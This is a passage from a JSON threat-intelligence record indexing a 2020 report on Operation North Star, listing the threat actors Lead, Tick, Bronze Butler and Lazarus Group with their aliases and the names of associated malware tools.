            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-05 - Operation North Star- Behind The Scenes.pdf"
    ],
    "report_names": [
        "2020-11-05 - Operation North Star- Behind The Scenes.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536139,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653686854,
    "ts_modification_date": 1653686854,
    "files": {
        "pdf": "https://archive.orkl.eu/85e63ebdf932a30f6a0bd380e74902d14137d279.pdf",
        "text": "https://archive.orkl.eu/85e63ebdf932a30f6a0bd380e74902d14137d279.txt",
        "img": "https://archive.orkl.eu/85e63ebdf932a30f6a0bd380e74902d14137d279.jpg"
    }
}